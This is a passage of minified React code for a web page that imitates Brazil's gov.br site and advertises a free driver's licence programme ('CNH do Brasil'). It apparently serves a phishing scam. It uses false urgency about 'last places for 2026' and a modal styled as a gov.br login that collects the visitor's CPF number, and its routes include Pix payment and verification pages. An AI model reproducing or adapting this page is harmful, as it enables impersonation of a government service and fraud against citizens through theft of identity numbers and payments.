          children: "Compartilhe:"
        }), l.jsxs("div", {
          className: "flex gap-3",
          children: [l.jsx("span", {
            className: "hover:opacity-80 transition-opacity cursor-pointer",
            style: {
              color: "#276FE8"
            },
            children: l.jsx(Lg, {
              size: 18
            })
          }), l.jsx("span", {
            className: "hover:opacity-80 transition-opacity cursor-pointer",
            style: {
              color: "#276FE8"
            },
            children: l.jsx(tT, {
              size: 18
            })
          }), l.jsx("span", {
            className: "hover:opacity-80 transition-opacity cursor-pointer",
            style: {
              color: "#276FE8"
            },
            children: l.jsx(Og, {
              size: 18
            })
          }), l.jsx("span", {
            className: "hover:opacity-80 transition-opacity cursor-pointer",
            style: {
              color: "#276FE8"
            },
            children: l.jsx(nT, {
              size: 18
            })
          }), l.jsx("span", {
            className: "hover:opacity-80 transition-opacity cursor-pointer",
            style: {
              color: "#276FE8"
            },
            children: l.jsx(iT, {
              size: 18
            })
          })]
        })]
      }), l.jsxs("div", {
        className: "text-sm text-gray-500 mb-6",
        children: [l.jsx("p", {
          children: "Publicado em 09/12/2025 20h58"
        }), l.jsx("p", {
          children: "Atualizado em 10/12/2025 14h42"
        })]
      }), l.jsx("div", {
        className: "mb-8",
        style: {position: "relative", paddingBottom: "56.25%", height: 0, overflow: "hidden", borderRadius: "0.5rem", boxShadow: "0 4px 6px rgba(0,0,0,0.1)"},
        children: l.jsx("iframe", {
          src: "https://www.youtube.com/embed/Bn8olS-_EsQ",
          title: "Lançamento do Programa CNH do Brasil",
          allow: "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture",
          allowFullScreen: true,
          style: {position: "absolute", top: 0, left: 0, width: "100%", height: "100%", border: 0}
        })
      }), l.jsxs("article", {
        className: "prose prose-lg max-w-none",
        children: [l.jsxs("p", {
          className: "text-base leading-relaxed mb-4",
          style: {
            color: "#555555"
          },
          children: [l.jsx("span", {
            className: "float-left text-5xl font-bold text-[#1351B4] mr-3 mt-1 leading-none",
            children: "O"
          }), "processo para obter a primeira Carteira Nacional de Habilitação ficou mais simples com o aplicativo CNH do Brasil, plataforma oficial do Ministério dos Transportes. Pelo celular, o cidadão pode abrir o requerimento, acompanhar todas as etapas, realizar o curso teórico gratuito e acessar a versão digital da habilitação. Confira, ponto a ponto, como funciona."]
        }), l.jsxs("div", {
          className: "text-center my-8",
          children: [l.jsx("button", {
            onClick: () => {
              var w;
              return (w = document.getElementById("como-se-inscrever")) == null ? void 0 : w.scrollIntoView({
                behavior: "smooth"
              })
            },
            className: "bg-[#1351B4] hover:bg-[#0D3C8C] text-white font-semibold py-3 px-6 rounded-full text-base transition-all transform hover:scale-105 shadow-lg",
            children: "Fazer Minha Inscrição Agora"
          }), l.jsx("p", {
            className: "text-base leading-relaxed mt-3",
            style: {
              color: "#555555",
              opacity: .6
            },
            children: "Últimas vagas para 2026"
          })]
        }), l.jsx("h2", {
          className: "text-xl font-bold mt-8 mb-4",
          style: {
            color: "#333333"
          },
          children: "1. O que mudou com a nova resolução?"
        }), l.jsxs("ul", {
          className: "list-disc pl-6 space-y-3 mb-6 text-base leading-relaxed",
          style: {
            color: "#555555"
          },
          children: [l.jsxs("li", {
            children: [l.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "Fim da obrigatoriedade de autoescola:"
            }), " Candidatos não precisam mais frequentar Centros de Formação de Condutores (CFCs)"]
          }), l.jsxs("li", {
            children: [l.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "Curso teórico online e gratuito:"
            }), " Disponível após realizar o cadastro."]
          }), l.jsxs("li", {
            children: [l.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "Carga horária prática reduzida:"
            }), " De 20 horas obrigatórias para apenas 2 horas mínimas"]
          }), l.jsxs("li", {
            children: [l.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "Aulas práticas flexíveis:"
            }), " Podem ser realizadas com instrutor autônomo credenciado pelo Detran"]
          }), l.jsxs("li", {
            children: [l.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "Redução de até 80% nos custos:"
            }), " Processo que antes custava entre R$ 3.000 e R$ 5.000 agora pode sair praticamente de graça"]
          })]
        }), l.jsxs("div", {
          className: "px-4 py-3 mb-6 mx-auto",
          style: {
            backgroundColor: "#F3F3F4",
            borderRadius: "6px",
            maxWidth: "95%"
          },
          children: [l.jsx("p", {
            className: "font-semibold text-base",
            style: {
              color: "#333333"
            },
            children: "Últimas Vagas para 2026"
          }), l.jsxs("p", {
            className: "text-base leading-relaxed",
            style: {
              color: "#555555"
            },
            children: ["Devido à alta demanda, restam poucas vagas para obter a CNH gratuitamente e sem autoescola. Estas são as últimas vagas disponíveis para ", l.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "janeiro de 2026"
            }), ". Caso não realize a inscrição com urgência, a próxima oportunidade será somente entre 2026 e 2027. Quem não se cadastrar arcará com os custos integrais do processo de habilitação."]
          })]
        }), l.jsx("div", {
          id: "como-se-inscrever",
          className: "mb-6",
          children: l.jsx("img", {
            src: "https://www.gov.br/transportes/pt-br/assuntos/noticias/2025/12/cnh-do-brasil-como-solicitar-a-primeira-habilitacao-pelo-aplicativo/thumb-cnh-2.png",
            alt: "CNH do Brasil - Como se inscrever",
            className: "w-full rounded-lg shadow-md"
          })
        }), l.jsx("h2", {
          className: "text-xl font-bold mt-8 mb-4",
          style: {
            color: "#333333"
          },
          children: "2. Como se inscrever no programa?"
        }), l.jsx("p", {
          className: "text-base leading-relaxed mb-4",
          style: {
            color: "#555555"
          },
          children: "O processo de inscrição é simples e pode ser feito totalmente online:"
        }), l.jsxs("ol", {
          className: "list-decimal pl-6 space-y-3 mb-6 text-base leading-relaxed",
          style: {
            color: "#555555"
          },
          children: [l.jsx("li", {
            children: "Clique no botão abaixo para iniciar seu cadastro"
          }), l.jsx("li", {
            children: "Informe seu CPF para verificar elegibilidade"
          }), l.jsx("li", {
            children: "Confirme seus dados pessoais"
          }), l.jsx("li", {
            children: "Sua Carteira de Motorista será emitida em até 20 dias"
          })]
        }), l.jsxs("div", {
          className: "text-center my-8",
          children: [l.jsx("button", {
            onClick: f,
            className: "bg-[#1351B4] hover:bg-[#0D3C8C] text-white font-semibold py-3 px-6 rounded-full text-base transition-all transform hover:scale-105 shadow-lg",
            children: l.jsx("span", {
              className: "underline",
              children: "Fazer Minha Inscrição Agora"
            })
          }), l.jsx("p", {
            className: "text-base leading-relaxed mt-3",
            style: {
              color: "#555555",
              opacity: .6
            },
            children: "Últimas vagas para 2026"
          })]
        }), l.jsxs("div", {
          className: "mt-8",
          children: [l.jsx("h2", {
            className: "text-xl font-bold mt-8 mb-4",
            style: {
              color: "#333333"
            },
            children: "3. Base Legal"
          }), l.jsxs("ul", {
            className: "list-disc pl-6 space-y-2 text-base leading-relaxed",
            style: {
              color: "#555555"
            },
            children: [l.jsx("li", {
              children: "Resolução Contran nº 985/2025"
            }), l.jsx("li", {
              children: "Lei nº 14.071/2020 (Nova Lei de Trânsito)"
            }), l.jsx("li", {
              children: "Decreto nº 11.999/2025 (Programa CNH do Brasil)"
            })]
          })]
        })]
      })]
    }), l.jsx("footer", {
      className: "text-white mt-12 w-full",
      style: {
        backgroundColor: "#071D41",
        display: "block"
      },
      children: l.jsxs("div", {
        className: "px-6 py-8",
        children: [l.jsx("span", {
          className: "text-3xl font-bold italic text-white mb-8 block",
          children: "gov.br"
        }), l.jsx("div", {
          className: "border-t border-white/20 pt-6",
          children: l.jsxs("div", {
            className: "space-y-0",
            children: [l.jsxs("div", {
              className: "flex justify-between items-center py-4 border-b border-white/20",
              children: [l.jsx("span", {
                className: "font-semibold",
                children: "ASSUNTOS"
              }), l.jsx(Zr, {
                className: "text-white/70"
              })]
            }), l.jsxs("div", {
              className: "flex justify-between items-center py-4 border-b border-white/20",
              children: [l.jsx("span", {
                className: "font-semibold",
                children: "ACESSO À INFORMAÇÃO"
              }), l.jsx(Zr, {
                className: "text-white/70"
              })]
            }), l.jsxs("div", {
              className: "flex justify-between items-center py-4 border-b border-white/20",
              children: [l.jsx("span", {
                className: "font-semibold",
                children: "COMPOSIÇÃO"
              }), l.jsx(Zr, {
                className: "text-white/70"
              })]
            }), l.jsxs("div", {
              className: "flex justify-between items-center py-4 border-b border-white/20",
              children: [l.jsx("span", {
                className: "font-semibold",
                children: "CANAIS DE ATENDIMENTO"
              }), l.jsx(Zr, {
                className: "text-white/70"
              })]
            }), l.jsxs("div", {
              className: "flex justify-between items-center py-4 border-b border-white/20",
              children: [l.jsx("span", {
                className: "font-semibold",
                children: "CENTRAL DE CONTEÚDOS"
              }), l.jsx(Zr, {
                className: "text-white/70"
              })]
            }), l.jsxs("div", {
              className: "flex justify-between items-center py-4 border-b border-white/20",
              children: [l.jsx("span", {
                className: "font-semibold",
                children: "SERVIÇOS"
              }), l.jsx(Zr, {
                className: "text-white/70"
              })]
            })]
          })
        }), l.jsxs("div", {
          className: "mt-8 flex items-center gap-2 text-white/80",
          children: [l.jsx(sT, {}), l.jsx("span", {
            children: "Redefinir Cookies"
          })]
        }), l.jsxs("div", {
          className: "mt-8",
          children: [l.jsx("p", {
            className: "font-semibold mb-4",
            children: "REDES SOCIAIS"
          }), l.jsxs("div", {
            className: "flex gap-4",
            children: [l.jsx(lT, {
              size: 20
            }), l.jsx(rT, {
              size: 20
            }), l.jsx(Lg, {
              size: 20
            }), l.jsx(ZE, {
              size: 20
            }), l.jsx(eT, {
              size: 20
            }), l.jsx(Og, {
              size: 20
            })]
          })]
        })]
      })
    }), l.jsx("div", {
      className: "fixed right-4 top-1/2 z-50 cursor-pointer transition-transform duration-300 ease-in-out",
      style: {
        transform: `translateY(calc(-50% + ${r}px))`
      },
      "aria-label": "VLibras - Acessibilidade em Libras",
      children: l.jsx("img", {
        src: "https://vlibras.gov.br/app//assets/access_icon.svg",
        alt: "VLibras",
        className: "w-10 h-10"
      })
    }), l.jsx("button", {
      onClick: () => window.scrollTo({
        top: 0,
        behavior: "smooth"
      }),
      className: "fixed right-4 bottom-4 z-50 bg-[#1351B4] p-3 rounded-full shadow-lg hover:bg-[#0D3C8C] transition-colors",
      "aria-label": "Voltar ao topo",
      children: l.jsx(es, {
        className: "text-white rotate-[-90deg]",
        size: 16
      })
    }), o && l.jsx("div", {
      className: "fixed inset-0 bg-black/50 z-[100] flex items-center justify-center p-4",
      onClick: () => i(!1),
      children: l.jsxs("div", {
        className: "bg-white rounded-lg shadow-xl w-full max-w-md relative",
        onClick: w => w.stopPropagation(),
        children: [l.jsx("button", {
          onClick: () => i(!1),
          className: "absolute top-4 right-4 text-gray-500 hover:text-gray-700 transition-colors bg-transparent border-none p-0",
          "aria-label": "Fechar",
          style: {
            background: "none"
          },
          children: l.jsx(aT, {
            size: 20
          })
        }), l.jsxs("div", {
          className: "p-6",
          children: [l.jsx("div", {
            className: "flex justify-center mb-4",
            children: l.jsx("img", {
              src: "/cnh-brasil-logo.png",
              alt: "CNH do Brasil",
              className: "h-16 object-contain"
            })
          }), l.jsx("h3", {
            className: "text-center text-lg font-semibold mb-4",
            style: {
              color: "#333333"
            },
            children: "Identifique-se no gov.br com:"
          }), l.jsxs("div", {
            className: "flex items-center gap-2 p-3 bg-gray-100 rounded mb-4",
            children: [l.jsx("img", {
              src: "https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png",
              alt: "CPF",
              className: "w-5 h-5"
            }), l.jsx("span", {
              className: "text-sm font-medium",
              style: {
                color: "#1351B4"
              },
              children: "Número do CPF"
            })]
          }), l.jsxs("p", {
            className: "text-sm text-gray-600 mb-4",
            children: ["Digite seu CPF para ", l.jsx("strong", {
              children: "criar"
            }), " ou ", l.jsx("strong", {
              children: "acessar"
            }), " sua conta gov.br"]
          }), l.jsxs("form", {
            onSubmit: y,
            children: [l.jsx("label", {
              className: "block text-sm font-medium text-gray-700 mb-1",
              children: "CPF"
            }), l.jsx("input", {
              type: "tel",
              value: a,
              onChange: h,
              placeholder: "Digite seu CPF",
              className: "w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1351B4] focus:border-transparent mb-4"
            }), l.jsxs("button", {
              type: "submit",
              disabled: u || bo(a).length < 11,
              className: "w-full py-3 rounded-full font-semibold text-white flex items-center justify-center gap-2 transition-colors disabled:opacity-50",
              style: {
                backgroundColor: "#1351B4"
              },
              children: [u && l.jsx(vt, {
                className: "h-4 w-4 animate-spin"
              }), u ? "Acessando..." : "Continuar"]
            })]
          })]
        })]
      })
    })]
  })
}

function dT() {
  return l.jsx(WE, {
    children: l.jsxs(zN, {
      children: [l.jsx(At, {
        path: "/",
        component: uT
      }), l.jsx(At, {
        path: "/login",
        component: f3
      }), l.jsx(At, {
        path: "/verificacao",
        component: g3
      }), l.jsx(At, {
        path: "/saiba-mais",
        component: EE
      }), l.jsx(At, {
        path: "/success",
        component: gp
      }), l.jsx(At, {
        path: "/sucess",
        component: gp
      }), l.jsx(At, {
        path: "/verify-availability",
        component: kE
      }), l.jsx(At, {
        path: "/pagamento",
        component: RE
      }), l.jsx(At, {
        path: "/pix-payment",
        component: DE
      }), l.jsx(At, {
        path: "/cadastro-concluido",
        component: IE
      }), l.jsx(At, {
        path: "/chat",
        component: OE
      }), l.jsx(At, {
        path: "/:cpf",
        component: VE
      })]
    })
  })
}
ov(document.getElementById("root")).render(l.jsx(x.StrictMode, {
  children: l.jsxs(xS, {
    client: wS,
    children: [l.jsx(dT, {}), l.jsx(fN, {})]
  })
}));

